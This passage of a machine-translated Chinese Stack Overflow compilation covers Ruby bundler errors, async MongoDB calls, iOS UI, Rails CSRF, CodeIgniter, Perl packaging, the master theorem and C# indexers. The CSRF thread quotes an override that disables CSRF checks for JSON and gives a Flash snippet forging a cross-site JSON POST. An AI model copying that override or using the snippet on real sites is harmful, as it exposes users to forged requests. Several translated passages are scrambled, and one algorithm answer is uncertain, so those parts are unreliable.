   67 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/syck_hack.rb
   68 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/rubygems_integration.rb
   69 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/version.rb
   70 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler.rb
   71 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/core_ext/hash_with_indifferent_access.rb
   72 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/core_ext/ordered_hash.rb
   73 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/error.rb
   74 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/shell.rb
   75 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/invocation.rb
   76 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/parser/argument.rb
   77 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/parser/arguments.rb
   78 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/parser/option.rb
   79 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/parser/options.rb
   80 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/parser.rb
   81 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/task.rb
   82 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/util.rb
   83 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/base.rb
   84 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor.rb
   85 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/uri/common.rb
   86 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/uri/generic.rb
   87 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/uri/ftp.rb
   88 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/uri/http.rb
   89 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/uri/https.rb
   90 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/uri/ldap.rb
   91 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/uri/ldaps.rb
   92 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/uri/mailto.rb
   93 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/uri.rb
   94 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/core_ext/file_binary_read.rb
   95 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/actions/empty_directory.rb
   96 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/actions/create_file.rb
   97 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/actions/create_link.rb
   98 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/actions/directory.rb
   99 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/erb.rb
  100 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/time.rb
  101 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/open-uri.rb
  102 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/actions/file_manipulation.rb
  103 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/actions/inject_into_file.rb
  104 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/actions.rb
  105 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendored_thor.rb
  106 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/user_interaction.rb
  107 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/cli.rb
  108 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/delegate.rb
  109 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/tmpdir.rb
  110 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/thread.rb
  111 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/tempfile.rb
  112 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/shell/basic.rb
  113 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/shell/color.rb
  114 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/ui.rb
  115 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/settings.rb
  116 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/shared_helpers.rb
  117 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/x86_64-darwin11.4.0/socket.bundle
  118 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/socket.rb
  119 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/timeout.rb
  120 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/net/protocol.rb
  121 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/x86_64-darwin11.4.0/zlib.bundle
  122 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/net/http.rb
  123 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/net/http/faster.rb
  124 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/cgi/core.rb
  125 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/cgi/cookie.rb
  126 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/cgi/util.rb
  127 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/cgi.rb
  128 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/net/http/persistent.rb
  129 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/fetcher.rb
  130 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/tsort.rb
  131 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/dependency_list.rb
  132 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/package/f_sync_dir.rb
  133 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/package/tar_header.rb
  134 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/x86_64-darwin11.4.0/enc/iso_8859_1.bundle
  135 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/package/tar_input.rb
  136 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/package/tar_output.rb
  137 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/package/tar_reader/entry.rb
  138 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/package/tar_reader.rb
  139 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/package/tar_writer.rb
  140 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/package.rb
  141 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/format.rb
  142 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/ext/builder.rb
  143 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/ext/configure_builder.rb
  144 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/optparse.rb
  145 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/command.rb
  146 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/ext/ext_conf_builder.rb
  147 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/ext/rake_builder.rb
  148 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/ext.rb
  149 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/require_paths_builder.rb
  150 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/installer.rb
  151 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/remote_fetcher.rb
  152 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/errors.rb
  153 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/text.rb
  154 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/spec_fetcher.rb
  155 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/dependency_installer.rb
  156 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/environment.rb
  157 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/installer.rb
  158 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/x86_64-darwin11.4.0/digest.bundle
  159 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/digest.rb
  160 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/x86_64-darwin11.4.0/digest/sha1.bundle
  161 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/set.rb
  162 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/definition.rb
  163 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/dependency.rb
  164 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/dsl.rb
  165 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/open3.rb
  166 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/gem_installer.rb
  167 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/source.rb
  168 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/forwardable.rb
  169 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/spec_set.rb
  170 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/resolver.rb
  171 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/dep_proxy.rb
  172 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/index.rb
  173 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/x86_64-darwin11.4.0/openssl.bundle
  174 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/openssl/bn.rb
  175 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/openssl/cipher.rb
  176 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/openssl/config.rb
  177 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/openssl/digest.rb
  178 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/openssl/buffering.rb
  179 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/x86_64-darwin11.4.0/fcntl.bundle
  180 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/openssl/ssl-internal.rb
  181 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/openssl/x509-internal.rb
  182 /Users/ola/.rvm/rubi 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T22:56:25.420

刚好发生在我身上，可能你正在使用 rvm + macports。我在 RVM 文档中找到了解决方案：[https ://rvm.io/integration/macports/](https://rvm.io/integration/macports/)

> 为了在安装 RVM Rubies 时使用 MacPorts 库，请在 $HOME/.rvmrc 中设置以下变量：
> 
> ```
> export CFLAGS="-O2 -arch x86_64"
> export LDFLAGS="-L/opt/local/lib"
> export CPPFLAGS="-I/opt/local/include" 
> ```

```
rvm install 1.9.3 --with-opt-dir=/opt/local 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T18:32:57.653

`gem update bundler`在执行此操作之前尝试一次。

# javascript - 从 nodejs 的 mongodb 调用返回值

> ID：10676013
> 
> 赞同：0
> 
> 时间：2012-05-20T18:27:58.887
> 
> 标签：javascript, node.js, mongodb

如何从 mongojs 查询返回数组。我使用 nodejs 将以下查询执行到本地运行的 mongodb 数据库中。Mongojs 正在处理交易。我的问题是；如何从下面的函数调用中返回一个数组。

```
 var databaseUrl = "users";
    var collections = ["users","reports"]; 
    var db = require('mongojs').connect(databaseUrl, collections );

    function usernameFromId(callback){
      db.users.find({}, function(err, result) {
        if(err || !result) console.log("Error");
          else{
           callback(result);
          }
      });
     };

    var x = usernameFromId(function(user){
    return user;
    });

    console.log(x); 
```

这里 x 是未定义的，我怎样才能使返回值使 x 成为一个数组，我可以通过 x.name、x.email 等访问元素。

这是数据库中保存的内容。

```
 { "_id" : ObjectId("4fb934a75e189ff2422855be"), "name" : "john", 
 "password":"abcdefg", "email" : "john@example.com" }
 { "_id" : ObjectId("4fb934bf5e189ff2422855bf"), "name" : "james", 
 "password" :"123456", "email" : "james@example.com" } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T18:38:24.490

您不能`return`使用异步函数。您必须在回调中处理结果：

```
usernameFromId(function(user){
    console.log(user);
}); 
```

这是由于异步编程的本质：“***立即退出****，设置一个回调函数以在将来的某个时间调用。* ”这意味着：

```
var x = usernameFromId(...); 
```

在实际调用回调之前，对其整体进行评估（包括设置为从 返回`x`的`undefined`值`usernameFromId`）：

```
function (user) {
    return user;
} 
```

而且，至少对于[ECMAScript 5](http://en.wikipedia.org/wiki/ECMAScript#Versions)的当前标准，您无法解决这个问题。由于 JavaScript 是单线程的，任何等待回调的尝试只会锁定单线程，将回调和`return user`永远挂起的事件保留在事件队列中。

# ios - 在 iOS 上，有什么好方法可以实现一个充满小部件的滑出式面板？

> ID：10676014
> 
> 赞同：2
> 
> 时间：2012-05-20T18:28:19.050
> 
> 标签：ios, uiview, interface-builder

我想知道对于 iOS 应用程序，实现带有按钮和滑块的滑出式面板的最佳方法是什么？

也就是说，该应用程序将在屏幕的右下角有一个小的“i”图标，如下所示：

![在此处输入图像描述](../Images/9c916e8ca6820a864c83f9df25810991.png)

当触摸该图标时，大约屏幕 1/4 大小的面板将从底部滑出，显示按钮、滑块或可能的其他一些小部件。

实现它的最佳方法是什么 - 使用 Interface Builder 还是纯粹通过代码更好，以及用于面板的对象（UIView 或任何具有此滑出/滑入功能的现有小部件？）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T18:53:43.493

假设您要在应用程序中的多个位置使用它，您可能希望将其作为可重用组件。我建议让滑出屏幕成为它自己的视图控制器，如果需要，您可以使用 IB 创建它的视图。当用户点击“i”时，您将分配滑出视图控制器，将其视图作为子视图添加到当前视图控制器并为其设置动画。如果您需要在滑出和当前视图控制器之间进行通信，您可以在您的幻灯片上创建自定义委托协议。我认识到这是在做一些假设，但对您来说可能是一个干净的解决方案。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T18:56:50.823

通过 Interface Builder 创建它是一种痛苦（无论如何，该工具很烂）。您绝对应该在代码中创建它。如果您可以专注于代码并且不必为了完全显示视图而在 IB 中设置神秘属性，那么维护起来也会更容易......

您可以尝试像这样实现它：

```
@interface SlideOutMenu: UIView {
    UIImageView *imgView;
    UITapGestureRecognizer *tap;
}

- (id)initWithImage:(UIImage *)img;

@end

@implementation SlideOutMenu

- (id)initWithImage:(UIImage *)img
{
    if ((self = [self initWithFrame:CGRectMake(0, someY, 44, 44)]))
    {
        imgView = [[UIImageView alloc] initWithImage:img];
        [self addSubview:imgView];
        [imgView release];

        tap = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(_tapped)];
        [self addGestureRecognizer:tap];
        [tap release];
    }
    return self;
}

- (void)_tapped
{
    if (self.frame.origin.x > 1.0) // 1.0: some tolerance b/c of floating point numbers
    {
        [UIView animateWithDuration:0.3 animations:^{
            self.frame = CGRectMake(0, self.frame.origin.y, self.frame.size.width, self.frame.size.height);
        }];
    }
    else
    {
        [UIView animateWithDuration:0.3 animations:^{
            self.frame = CGRectMake(120.0, self.frame.origin.y, self.frame.size.width, self.frame.size.height);
        }];
    }
}

@end 
```

# ios - 安全地禁用 json rails 调用的 csrf 令牌？

> ID：10676018
> 
> 赞同：7
> 
> 时间：2012-05-20T18:28:37.093
> 
> 标签：ios, security, ruby-on-rails-3.1

我有一个现有的 Rails 后端网站，它对服务器进行 json 调用。现在，我正在开发一个移动 iOS 应用程序以使用相同的后端并以 json 格式发送呼叫。但是，移动请求因以下原因而失败：

```
WARNING: Can't verify CSRF token authenticity 
```

在 stackoverflow 周围搜索，许多人建议使用以下方法禁用对 json 调用的 csrf 检查：

```
# Or this in your application_controller.rb
def verified_request?
  if request.content_type == "application/json"
    true
  else
    super()
  end
end 
```

但我的问题是，我不明白这如何防止 json 格式的 csrf 攻击？攻击者总是可以从他们的站点向我们的端点发送一个 json 请求。有人对此有见解吗？我找不到任何明确的答案。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T22:19:11.390

您所描述的内容很容易使用 Flash 进行利用：

```
 var request:URLRequest = new URLRequest("http://stackoverflow.com"); 
        request.requestHeaders.push(new URLRequestHeader('Content-Type', 'application/json'));      
        request.data = unescape('{"a":1,"b":{"c":3}}');
        request.method = URLRequestMethod.POST;
        navigateToURL(request, '_blank'); 
```

如果您查看[CSRF 预防备忘单](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) ，您可以检查引用者以确保其来自您信任的域。如果引用者为空，则它可能源自 https url，因此应视为失败。依赖 Ruby 的 CSRF 令牌是一种更强的 CSRF 保护形式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-06T09:06:48.313

这是对 ajax 的修复

从 rails 获取 csrf_token 或者如果使用其他东西，从 meta

```
// js file
var csrf_token = $('meta[name=csrf-token]').attr('content'); 
```

或者

```
//js.erb file
var csrf_token = "<%= request.session["<%= _csrf_token %>"] %>"; 
```

然后将其添加到js

```
$("body").bind("ajaxSend", function(elm, xhr, s){
   if (s.type == "POST") {
    // place lines mentioned above here
    // line goes here...
    xhr.setRequestHeader('X-CSRF-Token', csrf_token);
   }
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-03-02T21:03:37.880

您可以采取的一种方法是保留 CSRF 检查，但根据存在的 http 标头禁用。如果您的 json 请求有 JWT 令牌，您可以在相关控制器中执行类似的操作。

```
protect_from_forgery with: :exception, unless: -> { some_auth_token.valid? } 
```

表单提交将无法设置 http 标头，因此 csrf 将对其进行保护。

您的 json 请求应该有一个`Authorization`安全的标头。

# mysql - Codeigniter / Mysql：列数与insert_batch（）的值计数不匹配？

> ID：10676023
> 
> 赞同：1
> 
> 时间：2012-05-20T18:29:22.677
> 
> 标签：mysql, codeigniter, bulkinsert

好的，所以我在一个数组中有一个巨大的条目列表（比如 500+），我需要将其插入 MySQL 数据库。

我有一个填充数组的循环，如下所示：

```
$sms_to_insert[] = array(
    'text' => $text,
    'contact_id' => $contact_id,
    'pending' => $status,
    'date' => $date,
    'user_id' => $this->userId,
    'sent' => "1"
); 
```

然后我使用内置的 insert_batch() 函数将其发送到数据库：

```
public function add_sms_for_user($id, $sms) {
    //$this->db->delete('sms', array("user_id" => $id)); Irrelevant
    $this->db->insert_batch('sms', $sms); // <- This!
} 
```

我得到的错误消息如下：列计数与第 1 行的值计数不匹配。

现在，这根本没有意义。列与数组中的键相同，值是键值。那么，为什么它不起作用？

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T20:12:58.883

`user_id`原来是`null`在某些情况下，这就是导致错误的原因。

编辑：如果您将 insert_batch() 替换为在数组键上运行 insert() 的循环，您将获得更清晰的错误消息。

# macos - 创建独立 Mac OS X perl 应用程序的最简单方法

> ID：10676030
> 
> 赞同：2
> 
> 时间：2012-05-20T18:30:12.200
> 
> 标签：macos, perl, osx-lion

这可能是一个基本问题。我已经编写了一个小的 perl 脚本，可以在运行 OS X 的 Mac 上运行，可以通过以正常方式双击从 finder 中调用它。该文件是可执行的，包含开头，`#!/usr/bin/perl`输入和输出是通过剪贴板。这一切都有效，但会自动打开一个终端窗口，用户必须在执行完成后关闭该窗口。

有没有一种简单的方法可以在不打开终端的情况下将该程序作为应用程序运行？可以用本机 OS X perl 做到这一点吗？还是我需要下载一些东西？由于该程序也将被其他用户使用，因此解决方案越简单越好。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T19:41:00.420

使用应用程序“ **AppleScript Editor** ”：打开它

复制/粘贴此脚本

```
tell me to path to resource "this Name.pl" in directory "Scripts"
do shell script (quoted form of POSIX path of the result) 
```

在第一行中，将名称“ **this Name.pl** ”更改为您的 perl 文件的名称。

另存为 --> 应用程序

在 Finder 中：将您的 perl 文件（可执行文件）复制到已创建应用程序的文件夹“ */Contents/Resources/Scripts ”中*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T19:28:56.113

对于 Win32/Linux/或 Mac 使用[http://www.cavapackager.com/](http://www.cavapackager.com/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-11-06T19:40:34.570

如果您将应用程序分发给其他人，Platypus 包含一个安装程序，用于围绕脚本构建独立的应用程序。

[Platypus](http://sveinbjorn.org/platypus)支持 Perl、Python、PHP、Ruby、Swift、Expect、Tcl、AppleScript 或任何其他用户指定的解释器。它是根据三条款 BSD 许可条款分发的免费开源软件。它可以静默运行（根据您的需要，无需打开终端窗口），也可以将脚本执行的图形反馈显示为进度条、带有脚本输出的文本窗口、droplet、WebKit HTML 渲染或状态项菜单。

# ios - UITableView 水平行

> ID：10676031
> 
> 赞同：0
> 
> 时间：2012-05-20T18:30:22.183
> 
> 标签：ios, uitableview

我的表格视图有一个只有一个按钮的自定义单元格。我希望该行是水平的。我不能放很多按钮，因为我不知道会有多少项目。或者更确切地说，我有 1 行有很多列。我想要它：abc 不是垂直的。

我能做些什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T19:01:01.103

1.  添加新的按钮子视图会更改之前添加的按钮框架，以便所有按钮具有相同的宽度并占据单元格。

或 2\. 子类`UITableViewCell`，添加`NSMutableArray`以保留按钮，覆盖`layoutSubview`以排列按钮，调用将用于向该数组添加新`setNeedsDisplay`的方法，使用at 。`addButton:``UIButton``addButton:``cellForRowAtIndexPath`

这很容易，但是对于动态单元格，您需要注意单元格的重用，因为重用的单元格将具有来自早期创建的单元格的按钮子视图 - 您可以`cellForRowAtIndexPath`在添加新按钮之前简单地从单元格中删除所有子视图，或者您不能如果表格中没有太多单元格，则使用重用技术。

# algorithm - 大师方法——为什么不能解决T(n) = T(n/2) + n^2/logn？

> ID：10676034
> 
> 赞同：2
> 
> 时间：2012-05-20T18:30:36.723
> 
> 标签：algorithm, master-theorem

大师方法——为什么不能解决T(n) = 4*T(n/2) + (n^2)/logn？

我意识到它可以解决类型 T(n) = aT(n/b) + f(n) 的重复

在 MIT OCW 上，他们提到它无法解决上述重复出现的问题。有人可以解释为什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T21:15:24.393

T(n/2) + (n^2)/logn 的答案：

```
Case 1 does not apply because f(n) != O(n^-e) for any positive e.

Case 2 does not apply because f(n) != Θ(log^k(n)) for any k >= 0

Case 3 does not apply,
    f(n) = Ω(n^e) for e = 1, BUT
    a*f(n/b) <= c*f(n) for no c<1 (works out that c >= 2) 
```

所以我们不能申请任何案件。除此之外，我真的不好 - 而且我不是 100% 在这个答案上。

* * *

以下是在此编辑之前，并假设问题是关于 T(n) = T(n/2) + n^(2logn) 我很确定这是定理的第 3 种情况。

```
Case 1 does not apply because f(n) != O(n^-e) for any positive e.

Case 2 does not apply because f(n) != Θ(log^k(n)) for any k >= 0

Case 3 does apply,
    a*f(n/b) <= c*f(n) for some c<1 (works out that c >= 0.5)
    and f(n) = Ω(n^e) for e = 1 
```

我可能错了，所以检查一下，让我知道！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-01-20T17:31:52.413

f(n)=(n^2)/logn 和 n^(log a/log b) 。计算上述两个函数之间的差异。

比率= (n^2/log n)/(n^2)

这个比率原来是对数的。这种递推关系属于情况2和情况3之间的差距。因此，马斯特斯定理不适用于这种递推关系。

当上述两个函数之间的差是多项式时，Masters 定理是适用的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-09-19T07:22:07.463

这似乎是第三种情况，因为 f(n) 更大，但它也应该满足规则性条件（对于某些 c in(0,1)，af(n/b)<=cf(n)）。这里的函数不满足规律性条件，所以主方法在这里失败

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-08-28T02:02:41.437

这是因为在所有提到的三种情况下，您都无法证明正渐近性质是合理的。这意味着当 n->infinity n^2/lg(n) -> infinity 时，这只是意味着 n^e = w(lg(n))，可以解释为“函数不能包含”没有上限为分治程序而存在。

# c# - 访问集合

> ID：10676040
> 
> 赞同：0
> 
> 时间：2012-05-20T18:31:22.090
> 
> 标签：c#

我正在尝试创建一个类，您可以在其中访问其中的集合并使用字符串索引获取项目，（我希望这是有道理的），基本上我想知道这被称为什么或如何做到这一点？

这是我的意思的一个例子；

```
string blah = SomeClass.Items["Item1"].ToString(); 
```

希望有人能对此有所了解。

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T18:34:26.330

我想你正在寻找一个[indexer](http://msdn.microsoft.com/en-us/library/6x16t2tx.aspx)。

> 索引器允许类或结构的实例像数组一样被索引。索引器类似于属性，只是它们的访问器带有参数。

在您的情况下，您想使用字符串进行索引。像这样的东西：

```
public MyItem this[string index]
{
    get { return ... }
} 
```

`Items`从语法中删除层可能会更好。这将导致您的代码读取如下：

```
string blah = SomeClass["Item1"].ToString(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T18:34:40.590

你的意思是一个[字符串索引器](http://msdn.microsoft.com/en-us/library/6x16t2tx.aspx)。

> 索引器允许类或结构的实例像数组一样被索引。索引器类似于属性，只是它们的访问器带有参数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-20T18:34:00.227

使用[`Dictionary<string, string>`](http://msdn.microsoft.com/en-us/library/xfhwa508.aspx).

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-20T18:35:01.300

您可以使用 List 周围的包装器来获取“Items”属性。

```
public class MyClass
{

  private readonly List<string> _myColl = new List<string>();

  public List<string> Items
  { 
    get { return this._myColl; }
  }

} 
```

然后你可以像这样使用它：

```
MyClass c = new MyClass();
c.Items.Add("something"); 
```

如果你需要一个字符串键，你可以随时切换`List to Dictionary<string, string>`

```
public class MyClass
{

  private readonly Dictionary<string, string> _myColl = new Dictionary<string, string>();

  public Dictionary<string, string> Items
  { 
    get { return this._myColl; }
  }

} 
```

然后像这样使用它：

```
MyClass c = new MyClass();
c.Items.Add("somekey", "somevalue"); 
```

